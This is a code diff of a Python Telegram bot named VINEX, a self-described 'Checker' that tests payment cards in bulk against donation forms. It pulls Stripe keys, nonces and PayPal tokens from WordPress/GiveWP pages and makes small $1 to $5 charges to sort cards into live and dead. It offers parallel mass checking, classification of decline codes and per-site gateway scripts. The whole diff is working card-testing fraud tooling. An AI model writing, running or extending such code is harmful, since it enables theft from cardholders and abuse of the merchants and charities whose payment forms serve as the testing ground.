 CARD_DECLINES = ['INSTRUMENT_DECLINED','PAYER_CANNOT_PAY','ORDER_NOT_APPROVED','Payer has not yet approved','Payer cannot pay','PAYMENT_DENIED','DO_NOT_HONOR','INSUFFICIENT_FUNDS','CVV_FAILURE','CVV2_FAILURE','INVALID_OR_RESTRICTED','SUSPECTED_FRAUD','ACCOUNT_CLOSED','EXPIRED_CARD','CARD_EXPIRED','TRANSACTION_NOT_PERMITTED','GENERIC_DECLINE','TRANSACTION_REFUSED','AUTHORIZATION_DENIED','DECLINED','Your card has expired','Your card was declined','card_expired','expired_card','card_declined','incorrect_number','incorrect_cvc','invalid_number','invalid_expiry_month','invalid_expiry_year','invalid_cvc','processing_error','fraudulent','lost_card','pickup_card','restricted_card','REJECT64','REJECT_64','reject64','insufficient_funds','declined_by_issuer','transaction_declined','payment_declined','REJECTED','DECLINED','DENIED','REFUSED','EXPIRED']
 def is_card_decline(t):
     if not t: return False
-    s = str(t)
-    up = s.upper()
+    s = str(t); up = s.upper()
     for p in CARD_DECLINES:
         if p.upper() in up: return True
     for sep in (':','=','|',';','/'):
@@ -2102,7 +2075,7 @@ class PayPal:
             return r.text or ""
         except: return ""
     def _stripe_charge(self, amt, n, mm, yy, cvc, pid=None, mode='stripe'):
-        if not STRIPE_PK: return None, 'STRIPE_NO_PK'
+        if not STRIPE_PK: return None, 'STRIPE_SKIP_NO_PK'
         token = None; pm = None
         try:
             r = self.r.post('https://api.stripe.com/v1/payment_methods', auth=(STRIPE_PK,''), data={'type':'card','card[number]':n,'card[exp_month]':str(mm),'card[exp_year]':str(yy),'card[cvc]':str(cvc)}, timeout=20)
@@ -2121,12 +2094,6 @@ class PayPal:
                 r2 = self.r.post('https://api.stripe.com/v1/tokens', auth=(STRIPE_PK,''), data={'card[number]':n,'card[exp_month]':str(mm),'card[exp_year]':str(yy),'card[cvc]':str(cvc)}, timeout=20)
                 if r2.status_code == 200:
                     try: token = r2.json().get('id')
-                    except: pass
-                else:
-                    try:
-                        err = r2.json().get('error', {}); msg = err.get('message','FAIL'); code = err.get('code','')
-                        if code in ('card_declined','expired_card','insufficient_funds'): return f'{msg} ({code})', r2.text
-                        if 'expired' in msg.lower(): return 'Your card has expired', r2.text
                     except: pass
             except: pass
         if not token and not pm: return None, 'STRIPE_NO_TOKEN'
@@ -2155,7 +2122,6 @@ class PayPal:
             if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
             yy = yy.zfill(2)
             if not luhn_check(n): return "INVALID_CARD_NUMBER"
-
             pairs = []
             if PRICE_LEVELS:
                 for pid, amt in sorted(PRICE_LEVELS, key=lambda x: x[1]):
@@ -2164,7 +2130,6 @@ class PayPal:
             for amt in BASE_AMOUNTS:
                 if amt not in base_amts: pairs.append(("custom", amt))
             pairs = sorted(pairs, key=lambda x: float(x[1]))
-
             errors = []; best = None
             if STRIPE_PK:
                 for pid, amt in pairs:
@@ -2195,7 +2160,7 @@ class PayPal:
 def single_check():
     print("\n--- Single ---")
     try:
-        c = input("Card (num|mm|yy|cvc) [default: %s]: " % TEST_CARD).strip()
+        c = input("Card [default: %s]: " % TEST_CARD).strip()
         if not c: c = TEST_CARD
         p = PayPal(); print("->", p.Charge(c))
     except Exception as e: print("Err:", e)
@@ -2218,10 +2183,9 @@ def file_check():
     except Exception as e: print("Err:", e)
 
 def main():
-    print("VINEX Gateway v23 | " + PAGE_URL)
+    print("VINEX Gateway v23.1 | " + PAGE_URL)
     print("Stripe PK:", STRIPE_PK or "none")
     print("Prices:", PRICE_LEVELS)
-    print("Default card:", TEST_CARD)
     while True:
         try:
             c = input("\n[1] Single [2] File [0] Exit: ").strip()
@@ -2248,19 +2212,16 @@ def generate_gateway_code(result, link, tester=None):
     p = urlparse(link); host = p.netloc or 'invalid.local'
     pl = tester.price_levels if tester and tester.price_levels else []
     ff = tester.form_fields if tester and tester.form_fields else {}
-    cm = tester.all_card_modes if tester and tester.all_card_modes else []
     return _GATEWAY_TEMPLATE.safe_substitute(
         page_url=link, ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
         id_form1=g('id_form1'), id_form2=g('id_form2'), nonce=g('nonce'),
         access_token=g('au'), paypal_meta=g('paypal'), client_id=g('client_id'),
         stripe_pk=g('stripe_pk'), currency=g('currency', 'USD'), minimum=g('minimum', '5.00'),
         current_pid=g('current_price_id'),
-        price_levels_json=repr(pl), form_fields_json=repr(ff), card_modes_json=repr(cm),
+        price_levels_json=repr(pl), form_fields_json=repr(ff),
     )
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   BOT HANDLERS
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ BOT HANDLERS ═══════════
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     try:
@@ -2272,7 +2233,7 @@ def cmd_start(message):
         uid = message.from_user.id
         name = message.from_user.first_name or 'User'
         text = (
-            f'[⚡] {SB("Welcome to Vinex v23")} {ve("party")}\n'
+            f'[⚡] {SB("Welcome to Vinex v23.1")} {ve("party")}\n'
             f'{vsep()}\n'
             f'{vt("User", f"{name} [VIP]")}\n'
             f'{vt("ID", f"<code>{uid}</code>")}\n'
@@ -2286,7 +2247,7 @@ def cmd_start(message):
             f'{vt("Diag", "<code>/diag URL</code>")}\n'
             f'{vsep()}\n'
             f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
-            f'{vt("Gateways", "Stripe + PayPal + Raw")}\n'
+            f'{vt("Gateways", "Stripe + PayPal (4 modes) + Raw")}\n'
             f'{vt("Workers", "8 Parallel")}\n'
             f'{vt("TestCard", "<code>4232...903</code>")}\n'
             f'[⚡] {SB("Vinex")} - {B("Checker")}'
@@ -2307,13 +2268,13 @@ def cmd_help(message):
     try:
         react_to(message, '💡')
         text = (
-            f'[⚡] {SB("Vinex Manual v23")} {ve("gear")}\n'
+            f'[⚡] {SB("Vinex Manual v23.1")} {ve("gear")}\n'
             f'{vsep()}\n'
             f'{vt("Single", "<code>/paypal URL</code>")}\n'
-            f'  {SB("→")} Stripe + PayPal + Raw Card\n'
+            f'  {SB("→")} Stripe + PayPal (4 modes) + Raw Card\n'
             f'  {SB("→")} Amounts: 1$ → 3$ → 5$\n'
-            f'  {SB("→")} 22-pattern form-id detection\n'
-            f'{vt("Bulk", "<code>/mass</code> + .txt — 8 parallel workers")}\n'
+            f'  {SB("→")} Real gateway shown in Actual\n'
+            f'{vt("Bulk", "<code>/mass</code> + .txt — 8 parallel")}\n'
             f'{vt("Control", "<code>/stop</code> / <code>/resume</code>")}\n'
             f'{vt("Diag", "<code>/diag URL</code>")}\n'
             f'{vsep()}\n'
@@ -2335,7 +2296,7 @@ def cmd_ping(message):
             safe_edit_message(message.chat.id, sent.message_id,
                 f'[⚡] {SB("PONG")}\n{vsep()}\n'
                 f'{vt("Latency", f"<code>{dt:.0f} ms</code>")}\n'
-                f'{vt("Bot", "VINEX v23")}\n'
+                f'{vt("Bot", "VINEX v23.1")}\n'
                 f'{vt("Workers", "8")}\n'
                 f'{vt("TestCard", TEST_CARD)}')
     except: pass
@@ -2409,16 +2370,14 @@ def cmd_paypal(message):
                 safe_send_message(chat_id, f'[⚡] {B("Cooling")}: {rem}s')
                 return
         link_cooldowns[lkey] = now
-
         react_to(message, '⚡')
         show_typing(chat_id, 'typing', duration=3.0)
         ko = safe_send_message(chat_id,
             f'[⚡] {SB("Vinex Scanning")}\n{vsep()}\n'
             f'{vt("Target", f"<code>{link[:80]}</code>")}\n'
-            f'{vt("Engine", "v23 Universal")}\n'
+            f'{vt("Engine", "v23.1 Universal")}\n'
             f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
-            f'{vsep()}\n'
-            f'[⚡] {ve("gear")} {SB("Running Pipeline")}...')
+            f'{vsep()}\n[⚡] {ve("gear")} {SB("Running Pipeline")}...')
         if not ko: return
 
         bump_stat('checks')
@@ -2437,8 +2396,8 @@ def cmd_paypal(message):
                 f'{vt("User", f"{user_name} [VIP]")}\n'
                 f'{vt("Status", B("Dead"))} {ve("ban")}\n'
                 f'{vt("Response", f"<code>{resp_text}</code>")}\n'
-                f'{vt("Gateway", f"#{tester.gateway_type}")}\n'
-                f'{vt("Modes", f"<code>{chr(44).join(tester.enabled_modes[:3]) or chr(45)}</code>")}\n'
+                f'{vt("Detected", f"#{tester.gateway_type}")}\n'
+                f'{vt("Actual", f"#{tester.response_gateway or chr(45)}")}\n'
                 f'{vt("Prices", f"<code>{len(tester.price_levels)}</code>")}\n'
                 f'{vsep()}\n[⚡] {SB("Vinex")} - {B("Checker")}')
             return
@@ -2454,7 +2413,7 @@ def cmd_paypal(message):
             safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Error")}: <code>{str(e)[:200]}</code>')
             return
 
-        fname = f'vinex_v23_{int(time.time())}_{uid}.py'
+        fname = f'vinex_v23_1_{int(time.time())}_{uid}.py'
         try:
             with open(fname, 'w', encoding='utf-8') as f: f.write(code)
         except Exception as e:
@@ -2467,6 +2426,7 @@ def cmd_paypal(message):
         head = (f'[⚡] {SB("Charged")} {ve("party")} {ve("cash")}' if is_charge else f'[⚡] {SB("Hit Detected")} {ve("party")}')
         prices_count = len(tester.price_levels)
         cur_pid = tester.current_price_id or '—'
+        actual_gw = tester.response_gateway or '—'
 
         caption = (
             f'{head}\n{vsep()}\n'
@@ -2474,7 +2434,8 @@ def cmd_paypal(message):
             f'{vt("Status", B(status))} {ve("party")}\n'
             f'{vt("Response", f"<code>{display}</code>")}\n'
             f'{vt("Amount", f"<code>${tester.donation} {tester.currency}</code>")}\n'
-            f'{vt("Gateway", f"<code>#{tester.gateway_type}</code>")}\n'
+            f'{vt("Detected", f"<code>#{tester.gateway_type}</code>")}\n'
+            f'{vt("Actual", f"<code>#{actual_gw}</code>")}\n'
             f'{vt("Prices", f"<code>{prices_count} levels</code>")}\n'
             f'{vt("CurPID", f"<code>{cur_pid}</code>")}\n'
             f'{vsep()}\n[⚡] {SB("Vinex")} - {B("Checker")}'
@@ -2600,14 +2561,9 @@ def handle_mass_file(message):
     except: log.exception('handle_mass_file')
 
 def run_mass_job(chat_id, uid, links, start_idx, progress):
-    """v23: PARALLEL mass scan with 8 workers."""
-    total = len(links)
-    processed = start_idx
-    live = progress.get('live', 0)
-    dead = progress.get('dead', 0)
+    total = len(links); processed = start_idx; live = progress.get('live', 0); dead = progress.get('dead', 0)
     started_at = progress.get('started_at', time.time())
-    mass_active[uid] = True
-    mass_pause[uid] = False
+    mass_active[uid] = True; mass_pause[uid] = False
     results_file = RESULTS_TMPL.format(uid, int(started_at))
     live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
     try: os.makedirs(live_dir, exist_ok=True)
@@ -2694,10 +2650,12 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                         gpath = os.path.join(live_dir, f'gateway_{lv_idx}.py')
                         with open(gpath, 'w', encoding='utf-8') as f: f.write(code)
                         cur = tester.currency if tester else 'USD'
+                        actual_gw = (tester.response_gateway if tester else None) or 'unknown'
                         caption = (f'[⚡] {SB("LIVE")} #{lv_idx} {ve("party")}\n{vsep()}\n'
                                    f'{vt("URL", f"<code>{result["link"][:80]}</code>")}\n'
                                    f'{vt("Response", resp[:80])}\n'
-                                   f'{vt("Amount", f"<code>${result.get(chr(97)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116), chr(49)+chr(46)+chr(48)+chr(48))} {cur}</code>")}\n{vsep()}\n'
+                                   f'{vt("Amount", f"<code>${result.get(chr(97)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116), chr(49)+chr(46)+chr(48)+chr(48))} {cur}</code>")}\n'
+                                   f'{vt("Gateway", f"<code>#{actual_gw}</code>")}\n{vsep()}\n'
                                    f'[⚡] {SB("Vinex")} - {B("Checker")}')
                         sent = safe_send_document(chat_id, gpath, caption=caption)
                         if sent:
@@ -2743,17 +2701,15 @@ def cmd_diag(message):
         tester.Key()
         cf_info = '✅' if tester.cf_solved else ('⚠️' if tester.cf_detected else '—')
         report = (
-            f'[⚡] {SB("Diagnostics v23")}\n{vsep()}\n'
+            f'[⚡] {SB("Diagnostics v23.1")}\n{vsep()}\n'
             f'{vt("URL", f"<code>{link[:80]}</code>")}\n'
             f'{vt("GW", f"<code>{tester.gateway_type}</code>")}\n'
             f'{vt("PayMode", f"<code>{tester.actual_payment_mode or chr(45)}</code>")}\n'
             f'{vt("Modes", f"<code>{chr(44).join(tester.enabled_modes) or chr(45)}</code>")}\n'
-            f'{vt("CardModes", f"<code>{chr(44).join(tester.all_card_modes) or chr(45)}</code>")}\n'
-            f'{vt("HTML", f"<code>{len(tester.page_html)}b</code>")}\n'
+            f'{vt("PayPalModes", f"<code>{chr(44).join(tester.paypal_modes) or chr(45)}</code>")}\n'
             f'{vt("Form", f"<code>{tester.id_form2 or "NONE"}</code>")}\n'
             f'{vt("Nonce", f"<code>{tester.nonce or "NONE"}</code>")}\n'
             f'{vt("Prices", f"<code>{len(tester.price_levels)}</code>")}\n'
-            f'{vt("CurPID", f"<code>{tester.current_price_id or chr(45)}</code>")}\n'
             f'{vt("StripePK", f"<code>{(tester.stripe_pk[:24]+chr(46)+chr(46)) if tester.stripe_pk else chr(45)}</code>")}\n'
             f'{vt("CardFields", f"<code>{len(tester.card_field_names)}</code>")}\n'
             f'{vt("GiveWP", "✅" if tester.is_givewp else "❌")}\n'
@@ -2930,13 +2886,13 @@ def vinex_setup():
     except: pass
 
 if __name__ == '__main__':
-    log.info('VINEX v23 FINAL starting...')
+    log.info('VINEX v23.1 FINAL starting...')
     print(r'''
     __  ___  _  __ ______ _  __
    / / / _ \/ |/ // __/ / |/ /
   / /_/ // /    // _/ /    /
  /___/_//_/_/|_/___/_/_/|_/
-    v23 — Universal Multi-Gateway + 8 Parallel Workers
+    v23.1 — Full PayPal + Parallel + Universal
     ''')
     print(f'TEST_CARD: {TEST_CARD}')
     print(f'WORKERS: {PARALLEL_WORKERS}')
